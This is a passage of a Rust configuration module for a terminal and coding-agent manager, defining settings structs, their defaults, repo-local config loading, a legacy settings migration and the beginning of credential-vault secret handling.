    #[serde(default)]
    pub(crate) global_hotkey: Option<String>,
    /// Default issue filter mode: "assigned", "created", "mentioned", "all", or "disabled"
    #[serde(default = "default_issue_filter")]
    pub(crate) issue_filter: String,
    /// Master toggle for experimental features. Its three AI sub-flags went with
    /// the embedded engine (#784-0aec); what it still gates is the SSH Tunnels
    /// panel.
    #[serde(default)]
    pub(crate) experimental_features_enabled: bool,
    /// Sub-flag: reflow scrollback history on column resize. Keeps scrollback
    /// readable when side panels temporarily narrow the terminal, without
    /// affecting cursor-addressed TUIs on the visible screen.
    ///
    /// Defaults to true, including for a config.json written before the key
    /// existed: the grid reflowed unconditionally until this flag gained a
    /// consumer, so anything else would silently change behaviour on upgrade.
    #[serde(default = "default_true")]
    pub(crate) scrollback_reflow: bool,
    /// Terminal cursor style: "bar" (default), "block", "underline"
    #[serde(default = "default_cursor_style")]
    pub(crate) cursor_style: String,
    /// Terminal renderer: "webgl" (default, GPU-accelerated) or "canvas" (CPU, no atlas bugs)
    #[serde(default = "default_terminal_renderer")]
    pub(crate) terminal_renderer: String,
    /// Label each command block with its elapsed time while Ctrl+Cmd is held.
    /// Frontend-gated (the label is painted in the renderer); stored here so the
    /// choice persists — a field absent from this struct is dropped by serde on
    /// every `save_config`, which is exactly what happened to these three
    /// before they had a Settings toggle.
    #[serde(default = "default_true")]
    pub(crate) show_block_timestamps: bool,
    /// Draw command-block marks on the terminal scrollbar. Frontend-gated.
    #[serde(default = "default_true")]
    pub(crate) show_scrollbar_marks: bool,
    /// Let the block-fold shortcut collapse a command block's output.
    /// Frontend-gated.
    #[serde(default = "default_true")]
    pub(crate) block_folding_enabled: bool,
    /// Content index pre-warm strategy: "active_and_switch" (default), "active_only", "all_sequential"
    #[serde(default = "default_index_strategy")]
    pub(crate) index_strategy: String,
    /// Total heap the BM25 content indices may hold, in MB, before the least
    /// recently used are dropped (`content_index::enforce_memory_budget`).
    ///
    /// Configurable rather than a constant because the Rust backend does not
    /// hot-reload: retuning a constant would cost the user every live PTY
    /// session, while this is read from the in-memory config on every build.
    #[serde(default = "default_index_memory_budget_mb")]
    pub(crate) index_memory_budget_mb: usize,
    /// Minutes of idle + unfocused before SIGSTOP on process group. 0 = disabled.
    #[serde(default = "default_standby_timeout")]
    pub(crate) standby_timeout_minutes: u16,
    /// User-defined launchers shown in the "Open in" menu alongside built-ins.
    #[serde(default)]
    pub(crate) custom_launchers: Vec<CustomLauncher>,
    /// Show GitLens-style inline git blame on the active line in the code editor.
    #[serde(default = "default_true")]
    pub(crate) inline_blame_enabled: bool,
}

/// A user-defined launcher for the "Open in" menu. The executable is spawned
/// with `args`, each of which may contain `{path}`/`{file}`/`{line}`/`{column}`
/// placeholders (expanded in `agent::open_in_custom`). No icon field — custom
/// launchers share a single generic icon in the UI.
#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub(crate) struct CustomLauncher {
    pub(crate) id: String,
    pub(crate) name: String,
    pub(crate) executable: String,
    #[serde(default)]
    pub(crate) args: Vec<String>,
    #[serde(default = "default_true")]
    pub(crate) enabled: bool,
    /// Optional platform filter: "macos" | "windows" | "linux". None = all.
    #[serde(default)]
    pub(crate) platform: Option<String>,
}

fn default_language() -> String {
    "en".to_string()
}

fn default_vapid_subject() -> String {
    "mailto:noreply@tuicommander.com".to_string()
}

fn is_false(value: &bool) -> bool {
    !*value
}

/// `config` and `debug` stay off until the user enables them — for a fresh
/// install and for a config.json written before the field existed.
fn default_disabled_native_tools() -> Vec<String> {
    vec!["config".to_string(), "debug".to_string()]
}

fn default_update_channel() -> String {
    "stable".to_string()
}

/// 30 days. The cookie slides on every authenticated request, so this is the
/// longest a device may sit unused before it must log in again.
fn default_session_token_duration_secs() -> u64 {
    2_592_000
}

/// The default before it became 30 days. A config still holding exactly this value
/// was written by the old default and is moved to the new one on load.
const LEGACY_SESSION_TOKEN_DURATION_SECS: u64 = 86_400;

fn default_index_strategy() -> String {
    "active_and_switch".to_string()
}

/// 1 GB. Measured on this workload: an ordinary repo indexes to 60-100 MB, so
/// this holds 10-15 of them resident and only starts evicting for an outlier —
/// a 645 MB working tree indexed to 1.9 GB on its own. Set low enough to bound
/// the process well under the 4 GB memory tripwire in `cpu_watchdog`, high
/// enough that a normal day of switching repos never pays for a rebuild.
fn default_index_memory_budget_mb() -> usize {
    1024
}

fn default_standby_timeout() -> u16 {
    5
}

fn default_bell_style() -> String {
    "visual".to_string()
}

fn default_issue_filter() -> String {
    "assigned".to_string()
}

fn default_cursor_style() -> String {
    "bar".to_string()
}

fn default_terminal_renderer() -> String {
    "webgl".to_string()
}

fn default_mcp_port() -> u16 {
    3845
}

fn default_font_size() -> u16 {
    13
}

fn default_attachment_max_bytes() -> u64 {
    25 * 1024 * 1024
}

fn default_attachment_retention_days() -> u32 {
    7
}

fn default_font_weight() -> u16 {
    400
}

fn default_max_tab_name_length() -> u32 {
    25
}

fn default_remote_port() -> u16 {
    9876
}

impl Default for AppConfig {
    fn default() -> Self {
        Self {
            shell: None,
            font_family: "JetBrains Mono".to_string(),
            font_size: 14,
            font_weight: default_font_weight(),
            theme: "commander".to_string(),
            mcp_server_enabled: true,
            mcp_port: default_mcp_port(),
            mcp_config_installed: false,
            ide: String::new(),
            ego_executable: String::new(),
            ego_profile: String::new(),
            ai_chat_workspace: String::new(),
            ai_chat_sessions: HashMap::new(),
            ai_chat_peer_ids: HashMap::new(),
            ai_chat_launches: HashMap::new(),
            default_font_size: 13,
            attachment_max_bytes: default_attachment_max_bytes(),
            attachment_retention_days: default_attachment_retention_days(),
            services: ServicesConfig::default(),
            confirm_before_quit: true,
            confirm_before_closing_tab: true,
            max_tab_name_length: default_max_tab_name_length(),
            split_tab_mode: SplitTabMode::default(),
            tab_ordering_mode: TabOrderingMode::default(),
            tab_cycling_all_types: false,
            tab_tree_enabled: false,
            auto_show_pr_popover: true,
            prevent_sleep_when_busy: false,
            auto_update_enabled: true,
            auto_update_plugins_enabled: true,
            language: default_language(),
            disabled_plugin_ids: Vec::new(),
            update_channel: default_update_channel(),
            disabled_agents: Vec::new(),
            disabled_mcp_agents: Vec::new(),
            disabled_native_tools: default_disabled_native_tools(),
            intent_tab_title: true,
            suggest_followups: true,
            progress_tracking: true,
            copy_on_select: true,
            osc52_clipboard: true,
            show_last_prompt: true,
            bell_style: default_bell_style(),
            global_hotkey: None,
            collapse_tools: false,
            issue_filter: default_issue_filter(),
            experimental_features_enabled: false,
            scrollback_reflow: true,
            cursor_style: default_cursor_style(),
            terminal_renderer: default_terminal_renderer(),
            show_block_timestamps: true,
            show_scrollbar_marks: true,
            block_folding_enabled: true,
            index_strategy: default_index_strategy(),
            index_memory_budget_mb: default_index_memory_budget_mb(),
            standby_timeout_minutes: default_standby_timeout(),
            custom_launchers: Vec::new(),
            inline_blame_enabled: true,
        }
    }
}

// ---------------------------------------------------------------------------
// NotificationConfig
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct NotificationSounds {
    #[serde(default = "default_true")]
    pub(crate) question: bool,
    #[serde(default = "default_true")]
    pub(crate) error: bool,
    #[serde(default = "default_true")]
    pub(crate) completion: bool,
    #[serde(default = "default_true")]
    pub(crate) warning: bool,
    #[serde(default = "default_true")]
    pub(crate) info: bool,
    /// Buzzer an agent can raise over MCP when it needs the user back.
    #[serde(default = "default_true")]
    pub(crate) attention: bool,
}

impl Default for NotificationSounds {
    fn default() -> Self {
        Self {
            question: true,
            error: true,
            completion: true,
            warning: true,
            info: true,
            attention: true,
        }
    }
}

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct NotificationConfig {
    #[serde(default = "default_true")]
    pub(crate) enabled: bool,
    #[serde(default = "default_volume")]
    pub(crate) volume: f64,
    #[serde(default)]
    pub(crate) sounds: NotificationSounds,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) audio_device: Option<String>,
    /// Drop the completion chime for sessions created over MCP/HTTP (`session
    /// create`, `agent spawn`). An orchestration of many agents otherwise turns
    /// every finished worker into a beep. Visual signals (activity item, badge,
    /// OS notification) are unaffected.
    #[serde(default = "default_true")]
    pub(crate) silence_remote_completions: bool,
    /// Mirror every toast into the toolbar bell, so a message that auto-dismissed
    /// while the user looked elsewhere is still readable afterwards. Off means
    /// toasts stay transient — they appear, they fade, they leave no trace.
    #[serde(default = "default_true")]
    pub(crate) toasts_in_bell: bool,
    /// OS notification when a PR becomes ready, fails CI, gets changes requested
    /// or is merged. The bell alone is invisible while another app has focus.
    #[serde(default = "default_true")]
    pub(crate) pr_native_notifications: bool,
}

fn default_true() -> bool {
    true
}

fn default_volume() -> f64 {
    0.5
}

impl Default for NotificationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            volume: 0.5,
            sounds: NotificationSounds::default(),
            audio_device: None,
            silence_remote_completions: true,
            toasts_in_bell: true,
            pr_native_notifications: true,
        }
    }
}

// ---------------------------------------------------------------------------
// UIPrefsConfig — sidebar, panel sizes, settings nav width
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct UIPrefsConfig {
    #[serde(default = "default_true")]
    pub(crate) sidebar_visible: bool,
    #[serde(default = "default_sidebar_width")]
    pub(crate) sidebar_width: u32,
    #[serde(default)]
    pub(crate) diff_panel_visible: bool,
    #[serde(default)]
    pub(crate) markdown_panel_visible: bool,
    #[serde(default)]
    pub(crate) notes_panel_visible: bool,
    #[serde(default)]
    pub(crate) file_browser_panel_visible: bool,
    #[serde(default)]
    pub(crate) plan_panel_visible: bool,
    #[serde(default)]
    pub(crate) git_panel_visible: bool,
    #[serde(default)]
    pub(crate) outline_panel_visible: bool,
    #[serde(default)]
    pub(crate) references_panel_visible: bool,
    #[serde(default)]
    pub(crate) ai_chat_panel_visible: bool,
    /// File browser listing: "flat" or "tree".
    #[serde(default = "default_file_browser_view_mode")]
    pub(crate) file_browser_view_mode: String,
    /// Sidebar layout: "auto" (rich for a short list or a finger), "compact" or "rich".
    #[serde(default = "default_sidebar_density")]
    pub(crate) sidebar_density: String,
    /// Appearance used by the mobile PWA; independent of the desktop terminal theme.
    #[serde(default = "default_mobile_theme")]
    pub(crate) mobile_theme: String,
    #[serde(default = "default_panel_width")]
    pub(crate) diff_panel_width: u32,
    #[serde(default = "default_panel_width")]
    pub(crate) markdown_panel_width: u32,
    #[serde(default = "default_notes_panel_width")]
    pub(crate) notes_panel_width: u32,
    #[serde(default = "default_plan_panel_width")]
    pub(crate) plan_panel_width: u32,
    #[serde(default = "default_git_panel_width")]
    pub(crate) git_panel_width: u32,
    #[serde(default = "default_settings_nav_width")]
    pub(crate) settings_nav_width: u32,
    /// Settings "expert mode": when on, every control is visible regardless of
    /// its default/modified state. Off by default — a control at its default
    /// value stays hidden until switched on or until the value changes.
    #[serde(default)]
    pub(crate) settings_expert_mode: bool,
    /// Diff viewer mode: "split" (side-by-side) or "unified" (inline).
    #[serde(default = "default_diff_view_mode")]
    pub(crate) diff_view_mode: String,
    #[serde(default)]
    pub(crate) detached_panels: std::collections::HashMap<String, String>,
    /// Collapsed state of the GitHub panel sections, keyed by section id
    /// (`my-prs`, `prs`, `issues`). Absent key = the section's own default.
    #[serde(default)]
    pub(crate) github_section_collapsed: std::collections::HashMap<String, bool>,
}

fn default_diff_view_mode() -> String {
    "split".to_string()
}

fn default_file_browser_view_mode() -> String {
    "tree".to_string()
}

fn default_sidebar_density() -> String {
    "auto".to_string()
}

fn default_mobile_theme() -> String {
    "commander".to_string()
}

impl Default for UIPrefsConfig {
    fn default() -> Self {
        Self {
            sidebar_visible: true,
            sidebar_width: default_sidebar_width(),
            diff_panel_visible: false,
            markdown_panel_visible: false,
            notes_panel_visible: false,
            file_browser_panel_visible: false,
            plan_panel_visible: false,
            git_panel_visible: false,
            outline_panel_visible: false,
            references_panel_visible: false,
            ai_chat_panel_visible: false,
            file_browser_view_mode: default_file_browser_view_mode(),
            sidebar_density: default_sidebar_density(),
            mobile_theme: default_mobile_theme(),
            diff_panel_width: default_panel_width(),
            markdown_panel_width: default_panel_width(),
            notes_panel_width: default_notes_panel_width(),
            plan_panel_width: default_plan_panel_width(),
            git_panel_width: default_git_panel_width(),
            settings_nav_width: default_settings_nav_width(),
            settings_expert_mode: false,
            diff_view_mode: default_diff_view_mode(),
            detached_panels: std::collections::HashMap::new(),
            github_section_collapsed: std::collections::HashMap::new(),
        }
    }
}

fn default_sidebar_width() -> u32 {
    260
}
fn default_panel_width() -> u32 {
    400
}
fn default_notes_panel_width() -> u32 {
    350
}
fn default_plan_panel_width() -> u32 {
    350
}
fn default_git_panel_width() -> u32 {
    380
}
fn default_settings_nav_width() -> u32 {
    180
}

// ---------------------------------------------------------------------------
// RepoLocalConfig — team-shareable settings loaded from .tuic.json in repo root
// ---------------------------------------------------------------------------

/// Settings loaded from `.tuic.json` at the repository root.
/// These are team-shareable (committed to the repo) and override global defaults
/// but are overridden by per-repo app settings.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct RepoLocalConfig {
    /// Selected by the repository, bounded by the machine ego profile over ACP.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) ego_profile: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) base_branch: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) copy_ignored_files: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) copy_untracked_files: Option<bool>,
    // Script fields (setup_script, run_script, archive_script) intentionally
    // omitted — executing repo-committed scripts without TOFU prompt is unsafe.
    // Re-add when trust-on-first-use confirmation is implemented.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) worktree_storage: Option<WorktreeStorage>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) delete_branch_on_remove: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) auto_archive_merged: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) orphan_cleanup: Option<OrphanCleanup>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) pr_merge_strategy: Option<MergeStrategy>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) after_merge: Option<WorktreeAfterMerge>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
    /// Allowlist of upstream MCP server names relevant to this repo (None = all)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) mcp_upstreams: Option<Vec<String>>,
}

const REPO_LOCAL_CONFIG_FILE: &str = ".tuic.json";

/// Load `.tuic.json` from a repository root.
/// Returns `None` if the file doesn't exist or is malformed.
pub(crate) fn load_repo_local_config_from_path(
    repo_path: &std::path::Path,
) -> Option<RepoLocalConfig> {
    let path = repo_path.join(REPO_LOCAL_CONFIG_FILE);
    match std::fs::read_to_string(&path) {
        Ok(contents) => match serde_json::from_str::<RepoLocalConfig>(&contents) {
            Ok(config) => Some(config),
            Err(e) => {
                tracing::warn!(path = %path.display(), "Malformed config: {e}");
                None
            }
        },
        Err(_) => None,
    }
}

// ---------------------------------------------------------------------------
// RepoSettingsMap — per-repo settings keyed by repo path
// ---------------------------------------------------------------------------

#[derive(Clone, Default, Serialize, Deserialize)]
pub(crate) struct RepoSettingsEntry {
    pub(crate) path: String,
    #[serde(default)]
    pub(crate) display_name: String,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) base_branch: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) copy_ignored_files: Option<bool>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) copy_untracked_files: Option<bool>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) setup_script: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) run_script: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) archive_script: Option<String>,
    #[serde(default)]
    pub(crate) color: String,
    // -- Worktree settings (null = inherit from global) --
    #[serde(default)]
    pub(crate) worktree_storage: Option<WorktreeStorage>,
    #[serde(default)]
    pub(crate) prompt_on_create: Option<bool>,
    #[serde(default)]
    pub(crate) delete_branch_on_remove: Option<bool>,
    #[serde(default)]
    pub(crate) auto_archive_merged: Option<bool>,
    #[serde(default)]
    pub(crate) orphan_cleanup: Option<OrphanCleanup>,
    #[serde(default)]
    pub(crate) pr_merge_strategy: Option<MergeStrategy>,
    #[serde(default)]
    pub(crate) after_merge: Option<WorktreeAfterMerge>,
    /// Auto-fetch interval in minutes (0 or None = disabled)
    #[serde(default)]
    pub(crate) auto_fetch_interval_minutes: Option<u32>,
    /// Auto-delete local branch when PR is merged/closed
    #[serde(default)]
    pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
    /// Allowlist of upstream MCP server names relevant to this repo (None = all)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) mcp_upstreams: Option<Vec<String>>,
    /// Human-readable labels for branches/worktrees, keyed by branch name
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub(crate) branch_labels: HashMap<String, String>,
    /// Gather every worktree of this repo into one consolidated screen (#e767).
    /// Repo-specific, not inheritable: it describes how you want to look at THIS
    /// repo, and a global default would consolidate repos you never asked about.
    #[serde(default)]
    pub(crate) auto_consolidate_worktrees: bool,
    /// Repo-specific browser URL for Design Mode; never exported to .tuic.json.
    #[serde(default)]
    pub(crate) dev_server_url: Option<String>,
}

impl RepoSettingsEntry {
    /// Check if this entry has any non-default settings
    pub(crate) fn has_custom_settings(&self) -> bool {
        self.base_branch.is_some()
            || self.copy_ignored_files.is_some()
            || self.copy_untracked_files.is_some()
            || self.setup_script.is_some()
            || self.run_script.is_some()
            || self.archive_script.is_some()
            || !self.color.is_empty()
            || self.worktree_storage.is_some()
            || self.prompt_on_create.is_some()
            || self.delete_branch_on_remove.is_some()
            || self.auto_archive_merged.is_some()
            || self.orphan_cleanup.is_some()
            || self.pr_merge_strategy.is_some()
            || self.after_merge.is_some()
            || self.auto_fetch_interval_minutes.is_some()
            || self.auto_delete_on_pr_close.is_some()
            || self.mcp_upstreams.is_some()
            || !self.branch_labels.is_empty()
            || self.auto_consolidate_worktrees
            || self.dev_server_url.is_some()
    }
}

/// Global defaults applied to all repos unless overridden per-repo
#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct RepoDefaultsConfig {
    #[serde(default = "default_base_branch")]
    pub(crate) base_branch: String,
    #[serde(default)]
    pub(crate) copy_ignored_files: bool,
    #[serde(default)]
    pub(crate) copy_untracked_files: bool,
    #[serde(default)]
    pub(crate) setup_script: String,
    #[serde(default)]
    pub(crate) run_script: String,
    #[serde(default)]
    pub(crate) archive_script: String,
    // -- Worktree settings --
    #[serde(default)]
    pub(crate) worktree_storage: WorktreeStorage,
    #[serde(default = "default_true")]
    pub(crate) prompt_on_create: bool,
    #[serde(default = "default_true")]
    pub(crate) delete_branch_on_remove: bool,
    #[serde(default)]
    pub(crate) auto_archive_merged: bool,
    #[serde(default)]
    pub(crate) orphan_cleanup: OrphanCleanup,
    #[serde(default = "default_orphan_cleanup_countdown_seconds")]
    pub(crate) orphan_cleanup_countdown_seconds: u32,
    #[serde(default)]
    pub(crate) pr_merge_strategy: MergeStrategy,
    #[serde(default)]
    pub(crate) after_merge: WorktreeAfterMerge,
    /// Auto-fetch interval in minutes (0 = disabled)
    #[serde(default)]
    pub(crate) auto_fetch_interval_minutes: u32,
    /// Auto-delete local branch when PR is merged/closed
    #[serde(default)]
    pub(crate) auto_delete_on_pr_close: AutoDeleteOnPrClose,
}

impl Default for RepoDefaultsConfig {
    fn default() -> Self {
        Self {
            base_branch: default_base_branch(),
            copy_ignored_files: false,
            copy_untracked_files: false,
            setup_script: String::new(),
            run_script: String::new(),
            archive_script: String::new(),
            worktree_storage: WorktreeStorage::default(),
            prompt_on_create: true,
            delete_branch_on_remove: true,
            auto_archive_merged: false,
            orphan_cleanup: OrphanCleanup::default(),
            orphan_cleanup_countdown_seconds: default_orphan_cleanup_countdown_seconds(),
            pr_merge_strategy: MergeStrategy::default(),
            after_merge: WorktreeAfterMerge::default(),
            auto_fetch_interval_minutes: 0,
            auto_delete_on_pr_close: AutoDeleteOnPrClose::default(),
        }
    }
}

fn default_orphan_cleanup_countdown_seconds() -> u32 {
    10
}

fn default_base_branch() -> String {
    "automatic".to_string()
}

/// Map of repo path -> settings
#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct RepoSettingsMap {
    #[serde(default)]
    pub(crate) repos: HashMap<String, RepoSettingsEntry>,
}

// ---------------------------------------------------------------------------
// PromptLibraryConfig
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct PromptEntry {
    pub(crate) id: String,
    #[serde(default)]
    pub(crate) label: String,
    #[serde(default)]
    pub(crate) text: String,
    #[serde(default)]
    pub(crate) pinned: bool,
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct PromptLibraryConfig {
    #[serde(default)]
    pub(crate) prompts: Vec<PromptEntry>,
}

// ---------------------------------------------------------------------------
// AgentsConfig — per-agent run configurations
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct AgentRunConfig {
    pub(crate) name: String,
    pub(crate) command: String,
    #[serde(default)]
    pub(crate) args: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) model: Option<String>,
    #[serde(default)]
    pub(crate) env: HashMap<String, String>,
    #[serde(default)]
    pub(crate) is_default: bool,
}

pub(crate) const DEFAULT_IDLE_CLOSE_MINUTES: u32 = 15;

fn default_idle_close_minutes() -> u32 {
    DEFAULT_IDLE_CLOSE_MINUTES
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum EgoPermissionMode {
    Plan,
    Default,
    Edits,
    Auto,
    Yolo,
}

impl EgoPermissionMode {
    pub(crate) fn as_str(self) -> &'static str {
        match self {
            Self::Plan => "plan",
            Self::Default => "default",
            Self::Edits => "edits",
            Self::Auto => "auto",
            Self::Yolo => "yolo",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum EgoSandbox {
    Ro,
    Workspace,
}

impl EgoSandbox {
    pub(crate) fn as_str(self) -> &'static str {
        match self {
            Self::Ro => "ro",
            Self::Workspace => "workspace",
        }
    }
}

/// Unknown saved ego choices leave that option to ego without resetting other settings.
fn deserialize_ego_choice<'de, D, T>(deserializer: D) -> Result<Option<T>, D::Error>
where
    D: serde::Deserializer<'de>,
    T: serde::de::DeserializeOwned,
{
    let value = serde_json::Value::deserialize(deserializer)?;
    Ok(serde_json::from_value(value).ok())
}

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct AgentSettings {
    /// One-time migration marker: a removed bypass must stay removed.
    #[serde(default)]
    pub(crate) codex_bypass_migrated: bool,
    #[serde(default)]
    pub(crate) run_configs: Vec<AgentRunConfig>,
    /// Minutes a finished managed child stays available for follow-up. Zero disables cleanup.
    #[serde(default = "default_idle_close_minutes")]
    pub(crate) idle_close_minutes: u32,
    /// Automatically retry on server errors (5xx) by injecting "continue" into the session.
    /// Retries up to 3 times with exponential backoff (5s, 15s, 30s).
    #[serde(default)]
    pub(crate) auto_retry_on_error: bool,
    /// Shell command template for headless (one-shot) prompt execution.
    /// Placeholders like `{prompt}` are replaced before invocation.
    #[serde(default)]
    pub(crate) headless_template: Option<String>,
    /// Environment feature flags — key→value pairs injected into every spawn of this agent.
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub(crate) env_flags: HashMap<String, String>,
    /// Per-agent override for intent tab title. None = use agent-aware default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) intent_tab_title: Option<bool>,
    /// Per-agent override for suggested follow-ups. None = use global default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) suggest_followups: Option<bool>,
    /// Per-agent override for the Progress journal. None = use global default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) progress_tracking: Option<bool>,
    /// Opt-in: drive busy/idle/awaiting from the agent's native hooks instead of
    /// output heuristics. Enabling installs hooks into the agent's settings file;
    /// disabling removes only TUIC's entries. None/false = heuristics (default).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) hook_instrumentation: Option<bool>,
    /// Launch-scoped native status signals. Missing means enabled.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) native_status_signals: Option<bool>,
    /// Prefer native terminal scrollback for supported agent CLIs. Missing means enabled.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) prevent_alt_screen: Option<bool>,
    /// Accept the agent's workspace trust dialog on MCP-managed spawns only.
    /// Missing means enabled; user-opened terminals retain the CLI's behavior.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) skip_trust_dialog: Option<bool>,
    /// Launch-only ego permission overrides. Missing leaves ego configuration in control.
    #[serde(
        default,
        deserialize_with = "deserialize_ego_choice",
        skip_serializing_if = "Option::is_none"
    )]
    pub(crate) ego_mode: Option<EgoPermissionMode>,
    #[serde(
        default,
        deserialize_with = "deserialize_ego_choice",
        skip_serializing_if = "Option::is_none"
    )]
    pub(crate) ego_sandbox: Option<EgoSandbox>,
}

impl Default for AgentSettings {
    fn default() -> Self {
        Self {
            run_configs: Vec::new(),
            codex_bypass_migrated: false,
            idle_close_minutes: DEFAULT_IDLE_CLOSE_MINUTES,
            auto_retry_on_error: false,
            headless_template: None,
            env_flags: HashMap::new(),
            intent_tab_title: None,
            suggest_followups: None,
            progress_tracking: None,
            hook_instrumentation: None,
            native_status_signals: None,
            prevent_alt_screen: None,
            skip_trust_dialog: None,
            ego_mode: None,
            ego_sandbox: None,
        }
    }
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct AgentsConfig {
    #[serde(default)]
    pub(crate) agents: HashMap<String, AgentSettings>,
    /// Which agent CLI to use for headless (one-shot) prompt execution when no
    /// agent is running in the active terminal. Chosen by the user in Settings.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) headless_agent: Option<String>,
}

#[derive(Deserialize)]
pub(crate) struct ConfigSaveRequest<T> {
    pub(crate) base: T,
    pub(crate) config: T,
}

// ---------------------------------------------------------------------------
// Tauri commands — one load/save pair per config type
// ---------------------------------------------------------------------------

const APP_CONFIG_FILE: &str = "config.json";
const NOTIFICATION_CONFIG_FILE: &str = "notifications.json";
const UI_PREFS_FILE: &str = "ui-prefs.json";
const REPO_SETTINGS_FILE: &str = "repo-settings.json";
const REPO_DEFAULTS_FILE: &str = "repo-defaults.json";
const PROMPT_LIBRARY_FILE: &str = "prompt-library.json";
const REPOSITORIES_FILE: &str = "repositories.json";
const NOTES_FILE: &str = "notes.json";
const KEYBINDINGS_FILE: &str = "keybindings.json";
const PANE_LAYOUT_FILE: &str = "pane-layout.json";
const AGENTS_CONFIG_FILE: &str = "agents.json";
const ACTIVITY_FILE: &str = "activity.json";

// App config

/// Migrate flat service fields from pre-ServicesConfig format into nested `services` object.
fn migrate_flat_services(val: &mut serde_json::Value) {
    let obj = match val.as_object_mut() {
        Some(o) => o,
        None => return,
    };
    if obj.contains_key("services") {
        return;
    }
    // Only migrate if any flat field exists
    let flat_keys = [
        "remote_access_enabled",
        "remote_access_port",
        "remote_access_username",
        "remote_access_password_hash",
        "session_token",
        "session_token_duration_secs",
        "ipv6_enabled",
        "lan_auth_bypass",
        "relay_enabled",
        "relay_url",
        "relay_token",
        "relay_session_id",
        "push_enabled",
        "vapid_private_key",
        "vapid_public_key",
        "vapid_subject",
    ];
    if !flat_keys.iter().any(|k| obj.contains_key(*k)) {
        return;
    }

    let take = |obj: &mut serde_json::Map<String, serde_json::Value>, key: &str| {
        obj.remove(key).unwrap_or(serde_json::Value::Null)
    };

    let server = serde_json::json!({
        "enabled": take(obj, "remote_access_enabled"),
        "port": take(obj, "remote_access_port"),
        "ipv6_enabled": take(obj, "ipv6_enabled"),
    });
    let auth = serde_json::json!({
        "username": take(obj, "remote_access_username"),
        "password_hash": take(obj, "remote_access_password_hash"),
        "session_token": take(obj, "session_token"),
        "session_token_duration_secs": take(obj, "session_token_duration_secs"),
        "lan_auth_bypass": take(obj, "lan_auth_bypass"),
    });
    let relay = serde_json::json!({
        "enabled": take(obj, "relay_enabled"),
        "url": take(obj, "relay_url"),
        "token": take(obj, "relay_token"),
        "session_id": take(obj, "relay_session_id"),
    });
    let push = serde_json::json!({
        "enabled": take(obj, "push_enabled"),
        "vapid_private_key": take(obj, "vapid_private_key"),
        "vapid_public_key": take(obj, "vapid_public_key"),
        "vapid_subject": take(obj, "vapid_subject"),
    });

    obj.insert(
        "services".to_string(),
        serde_json::json!({
            "server": server,
            "auth": auth,
            "tls": { "mode": "off" },
            "relay": relay,
            "push": push,
        }),
    );
}

/// Read one secret from the credential vault.
///
/// `Ok(None)` means the vault answered and the secret genuinely is not there.
/// `Err` means the vault could not be consulted at all. Callers MUST keep those apart:
/// collapsing a failure into "absent" is how a valid secret gets deleted — see
/// [`hydrate_one_secret`].
fn read_secret(cred: crate::credentials::Credential<'_>) -> Result<Option<String>, String> {
    crate::credentials::get(cred)
}

/// What happened while hydrating one secret.
struct SecretHydration {
    /// The `*_exists` flag to record in the config.
    exists: bool,
    /// A plaintext secret was found in config.json and pushed into the vault, so the
    /// config must be rewritten to strip it from disk.
    migrated: bool,
}

/// Load one secret into `plaintext`, or migrate it into the vault if it is still
/// sitting in config.json.
///
/// `previous_exists` is what config.json last claimed. On a vault **read failure** it is
